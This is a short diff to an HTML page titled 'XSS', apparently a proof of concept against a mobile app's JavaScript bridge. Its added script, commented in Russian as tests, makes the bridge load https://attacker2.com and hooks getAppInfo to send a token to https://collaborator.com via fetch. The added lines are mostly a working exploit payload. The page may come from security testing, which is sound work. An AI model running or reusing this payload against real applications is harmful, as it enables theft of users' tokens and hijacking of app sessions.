@@ -2,7 +2,13 @@
 <body>
 <h1 id="result">XSS</h1>
 <script>
-alert(document.cookie);
+// Тест 1: открыть произвольный URL через Bridge
+Bridge.postMessage('JSON:{"type":"loadUrl","url":"https://attacker2.com"}');
+
+// Тест 2: украсть токен если getAppInfo вызывается
+window.getAppInfo = function(data) {
+  fetch('https://collaborator.com/?token=' + encodeURIComponent(data));
+}
 </script>
 </body>
 </html>
